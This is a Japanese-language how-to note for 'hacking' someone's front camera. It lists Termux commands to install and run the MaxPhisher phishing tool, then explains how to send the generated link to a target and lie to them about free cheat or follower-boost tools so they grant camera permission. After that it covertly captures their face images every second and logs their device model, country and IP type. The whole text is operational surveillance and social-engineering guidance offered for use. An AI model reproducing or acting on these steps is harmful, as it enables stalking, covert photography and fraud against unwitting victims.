【内カメラHackノート】
禁止事項
・スクショ禁止
・画面録画禁止
・他人に無断で教える禁止
・必要な物
①Android（必須）
②termuxのアプリ（無料）･･･Googleでtermux apkダウンロードと調べDLする
③インターネット（必須）
④少々英語が読める（読めなくても指示通りにすればいい）

・ 初めにtermuxを開きコードを入力します
※コードをペーストする時に空白が最後に入っていると起動しません
※9まではコードが途中で止まってもEnterを押して次に進みます
①
apt-get update -y

②
apt-get upgrade -y

③
pkg install python -y

④
pkg install python2 -y

⑤
pkg install git -y

⑥
pkg install git python3 php openssh -y

⑧
cd MaxPhisher

⑨
pip3 install -r files/requirements.txt --break-system-packages

⑩ツールの起動
python3 maxphisher.py

・これで内カメHack URLが完成するのでコピーしてターゲットに送り付ける
・ターゲットはカメラの許可を押すことにより 毎秒ずつターゲットの内カメの画像がtermuxに送信される
・保存された画像はファイルマネージャーアプリを開き、メインストレージ/Mediaに保存される
・これで相手の顔写真を撮ることが出来る
【詳細】
・ターゲットがカメラの許可を押さないとtermuxの画面には何も出てこない
押した場合は毎秒termuxに Media file captured! と表示される
・ターゲットがURLを踏んだ時点でターゲットのスマホの機種、国名、ipタイプが正確に分かる（住所は不明）
【重要】
・ターゲットも馬鹿では無いので、カメラの許可を押す人は少ない。 この動画で誘導させる⤵︎
動画へ移動する

※動画が再生されない場合はチャットで送ります
ターゲットにこの動画を送り、カメラの許可を押させる
・何か相手が欲しいものがあればダウンロードとしての話を作れる。
例
チートツール
Twitterフォロ爆ツール
インスタフォロ爆ツール
を無料であげるなどの嘘をつき誘導する
・他にカメラの許可を押させるための嘘ネタがある場合はそれを使う
【最後に】
・保存された画像は少し縦が短いので画像アプリで縦の長さを伸ばしてあげると本人の顔により近くなります
・場合によっては相手の内カメラが壊れていたり、暗いところでスマホを使用していたりすると上手く映らない場合があります
・ツールはcontrol➕Cボタンで終了出来ます。⑩までを実行したら次からは⑩だけ入力するとツールが起動します。
